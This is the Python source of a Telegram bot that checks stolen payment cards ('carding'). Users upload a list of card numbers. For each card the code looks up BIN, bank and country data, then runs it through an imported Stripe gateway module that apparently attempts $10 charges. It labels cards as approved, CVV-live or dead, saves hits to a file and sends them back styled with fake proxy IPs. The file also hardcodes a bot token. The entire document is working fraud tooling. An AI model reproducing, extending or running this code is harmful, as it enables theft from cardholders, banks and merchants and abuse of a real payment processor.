import requests
import random
from gatet import Tele
import time
import threading
from colorama import Fore, Style
import telebot
from telebot import types
import subprocess
import concurrent.futures


token = "6535718693:AAF_BIWUGJK-oADQbByh9EbiB69PiZSuKb8"
bot = telebot.TeleBot(token, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Send the file now")

@bot.message_handler(content_types=["document"])
def main(message):
    dd = 0
    live = 0
    ccn = 0
    ch = 0
    ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)
    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            for cc in lino:
                try:
                    data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
                    ii = cc[:6]
                except:
                    pass
                try:
                    bank = (data['bank']['name'])
                except:
                    bank = ('unknown')
                try:
                    emj = (data['country']['emoji'])
                except:
                    emj = ('unknown')
                try:
                    do = (data['country']['name'])
                except:
                    do = ('unknown')
                try:
                    dicr = (data['scheme'])
                except:
                    dicr = ('unknown')
                try:
                    typ = (data['type'])
                except:
                    typ = ('unknown')
                mes = types.InlineKeyboardMarkup(row_width=1)
                cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                cm2 = types.InlineKeyboardButton(f"• 𝗛𝗜𝗧𝗦 ✅: [ {ch} ] •", callback_data='x')
                cm3 = types.InlineKeyboardButton(f"• 𝗖𝗩𝗩 ☑️ : [ {live} ] •", callback_data='x')
                cm4 = types.InlineKeyboardButton(f"• 𝗖𝗖𝗡 ❎: [ {ccn} ] •", callback_data='x')
                cm5 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗔𝗗 ❌  : [ {dd} ] •", callback_data='x')
                cm6 = types.InlineKeyboardButton(f"• 𝗧𝗼𝘁𝗮𝗹 👻 : [ {total} ] •", callback_data='x')
                mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Checking with vps config 
𝗕𝗬 ⇾ @word2048 ''', reply_markup=mes)
                ip_address = ".".join(str(random.randint(0, 255)) for _ in range(4))
                time.sleep(2)
                def check_gateway(gateway):
                   try:
                       result2 = str(gateway(cc))
                       return result2
                   except Exception as e:
                       return str(e)
                gateways = [Tele]
                with concurrent.futures.ThreadPoolExecutor() as executor:
                   results = list(executor.map(check_gateway, gateways))

                for gateway, result2 in zip(gateways, results):
                   amt = "10$"
                   if "payment_intent_unexpected_state" in result2:
                       print(Fore.RED + 'Payment Intent Confirmed' + Style.RESET_ALL + ' ' + cc)
                   elif "succeeded" in result2:
                       print(Fore.GREEN + 'succeeded ' + amt + Style.RESET_ALL + ' ' + cc)
                       with open("hit.txt", "a") as f:
                        f.write(f'''
╔══════════════════════════╗
║  𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅
║  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$
║  𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Success
║  𝑪𝑪 ➜ {cc}                       
║  𝑩𝑰𝑵 ➜ {ii}</b>                         
║  𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}              
║  𝑩𝑨𝑵𝑲 ➜ {bank}
║  Flag ➜ {emj}
║  Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
''')
                       msg1 = f'''
╔══════════════════════════╗
║  <b>𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅</b>
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Success</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅</b>
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
                       ch += 1
                       bot.reply_to(message, msg1, parse_mode='HTML')
                   elif "insufficient funds." in result2:
                       print(Fore.RED + 'INSUFFICIENT FUNDS' + Style.RESET_ALL + ' ' + cc)
                       
                       with open("hit.txt", "a") as f:
                        f.write(f'''
╔══════════════════════════╗
║  𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅
║  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$
║  𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card has insufficient funds
║  𝑪𝑪 ➜ {cc}                       
║  𝑩𝑰𝑵 ➜ {ii}</b>                         
║  𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}              
║  𝑩𝑨𝑵𝑲 ➜ {bank}
║  Flag ➜ {emj}
║  Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
''')
                       msg2 = f'''
╔══════════════════════════╗
║  <b>𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅</b>
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card has insufficient funds</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅</b>
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
                       live += 1
                       bot.reply_to(message, msg2, parse_mode='HTML')
                   elif "incorrect_zip" in result2:
                       print(Fore.RED + 'incorrect_zip' + Style.RESET_ALL + ' ' + cc)
                   elif "Your card has insufficient funds." in result2:
                       print(Fore.RED + 'insufficient funds' + Style.RESET_ALL + ' ' + cc)
                       with open("hit.txt", "a") as f:
                        f.write(f'''
╔══════════════════════════╗
║  𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅
║  𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$
║  𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card has insufficient funds
║  𝑪𝑪 ➜ {cc}                       
║  𝑩𝑰𝑵 ➜ {ii}</b>                         
║  𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}              
║  𝑩𝑨𝑵𝑲 ➜ {bank}
║  Flag ➜ {emj}
║  Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
''')
                       msg2 = f'''
╔══════════════════════════╗
║  <b>𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅</b>
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card has insufficient funds</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅</b>
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
                       live += 1
                       bot.reply_to(message, msg2, parse_mode='HTML')
                   elif "security code is incorrect." in result2:
                       print(Fore.RED + 'security code is incorrect' + Style.RESET_ALL + ' ' + cc)
                       msg3 = f'''
╔══════════════════════════╗
║  <b>𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❎</b>
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card's security code is incorrect</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅</b>
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
                       ccn += 1
                       bot.reply_to(message, msg3, parse_mode='HTML')
                   elif "security code is invalid." in result2:
                       print(Fore.RED + 'security code is incorrect' + Style.RESET_ALL + ' ' + cc)
                       msg3 = f'''
╔══════════════════════════╗
║  <b>𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❎</b>
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card's security code is incorrect</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅</b>
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
                       ccn += 1
                       bot.reply_to(message, msg3)
                   elif "Error updating default payment method. Your card's security code is incorrect." in result2:
                       print(Fore.RED + 'security code is incorrect' + Style.RESET_ALL + ' ' + cc)
                       msg3 = f'''
╔══════════════════════════╗
║  <b>𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❎</b>
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card's security code is incorrect</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅</b>
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
                       ccn += 1
                       bot.reply_to(message, msg3, parse_mode='HTML')
                   elif "Your card's security code is incorrect" in result2:
                       print(Fore.RED + 'security code is incorrect' + Style.RESET_ALL + ' ' + cc)
                       msg3 = f'''
╔══════════════════════════╗
║  <b>𝗦𝗧𝗔𝗧𝗨𝗦 ➜ 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❎</b>
║  <b>𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ➜ 𝑺𝒕𝒓𝒊𝒑𝒆 10$</b>
║  <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ Your card's security code is incorrect</b>
║  <b>𝑪𝑪 ➜ <code>{cc}</code></b>                       
║  <b>𝑩𝑰𝑵 ➜ {ii}</b>                         
║  <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ➜ {do}</b>              
║  <b>𝑩𝑨𝑵𝑲 ➜ {bank}</b>     
║  <b>Flag ➜ </b>{emj}
║  <b>Proxy ➜{ip_address} 𝑳𝒊𝒗𝒆 ✅</b>
╚══════════════════════════╝

𝗕𝗼𝘁 𝗯𝘆: <b><code>@𝘄𝗼𝗿𝗱2048</code></b>
'''
                       ccn += 1
                       bot.reply_to(message, msg3, parse_mode='HTML')
                   elif "transaction_not_allowed" in result2:
                       print(Fore.RED + 'transaction_not_allowed' + Style.RESET_ALL + ' ' + cc)
                   elif "stripe_3ds2_fingerprint" in result2:
                       print(Fore.RED + '3D' + Style.RESET_ALL + ' ' + cc)
                   elif "generic_decline" in result2:
                       print(Fore.RED + 'GENERIC DECLINE' + Style.RESET_ALL + ' ' + cc)
                   elif "do_not_honor" in result2:
                       print(Fore.RED + 'DO NOT HONOR' + Style.RESET_ALL + ' ' + cc)
                   elif "fraudulent" in result2:
                       print(Fore.RED + 'FRAUDULENT' + Style.RESET_ALL + ' ' + cc)
                   elif "intent_confirmation_challenge" in result2:
                       print(Fore.RED + 'Captcha' + Style.RESET_ALL + ' ' + cc)
                   elif 'Your card was declined.' in result2:
                       print(Fore.RED + 'Decline' + Style.RESET_ALL + ' ' + cc)
                       dd += 1
                   else:
                       print(Fore.RED + 'Dead' + Style.RESET_ALL + ' ' + cc)
                       dd += 1
    except Exception as e:
        print(e)
bot.polling()
